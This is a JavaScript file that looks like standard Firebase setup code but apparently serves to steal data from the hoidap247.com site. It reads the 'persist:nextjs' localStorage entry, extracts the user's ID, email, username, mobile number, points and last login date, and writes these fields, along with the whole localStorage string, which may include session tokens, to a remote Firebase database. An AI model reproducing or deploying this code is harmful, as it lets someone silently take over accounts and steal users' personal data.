// Import the functions you need from the SDKs you need
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyAEZ-GF4JyfSPF-YE-aAPNDHke-Pc6nUCI",
    authDomain: "tuyensinh247-dc424.firebaseapp.com",
    projectId: "tuyensinh247-dc424",
    storageBucket: "tuyensinh247-dc424.appspot.com",
    messagingSenderId: "789063631644",
    appId: "1:789063631644:web:e5f8247e9a1366bbe170d9",
    databaseURL: "https://tuyensinh247-dc424-default-rtdb.firebaseio.com"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);


function convertJSONStringToObject(value) {
    try {
        // Parse the retrieved value to get the JSON object
        const parsedValue = JSON.parse(value);

        // For each property in the object, check if it's a stringified JSON and parse it
        for (const prop in parsedValue) {
            if (typeof parsedValue[prop] === 'string') {
                try {
                    parsedValue[prop] = JSON.parse(parsedValue[prop]);
                } catch (e) {
                    console.error("Error parsing property:", prop, "; value:", parsedValue[prop], "; error:", e);
                }
            }
        }
        return parsedValue;
    } catch (e) {
        console.error("Error parsing localStorage value for key:", key, "; error:", e);
        return null;
    }
}

const localStorageString = localStorage.getItem("persist:nextjs");
const parsedValue = convertJSONStringToObject(localStorageString);

const ID = parsedValue.user.info.id;
const Email = parsedValue.user.info.email;
const UserName = parsedValue.user.info.username;
const Mobile = parsedValue.user.info.mobile;
const Point = parsedValue.user.info.point;
const Last_login_date = parsedValue.user.info.last_login_date;


// Function to write data to the database
function writeData(ID, Email, UserName, Mobile, Point, Last_login_date, localStorageString) {
    const db = getDatabase();
    set(ref(db, `hoidap247.com/${ID}`), {
        Email: Email,
        UserName: UserName,
        Mobile: Mobile,
        Point: Point,
        Last_login_date: Last_login_date,
        LocalStorage: localStorageString
    });
}

// Call the writeData function
writeData(ID, Email, UserName, Mobile, Point, Last_login_date, localStorageString);
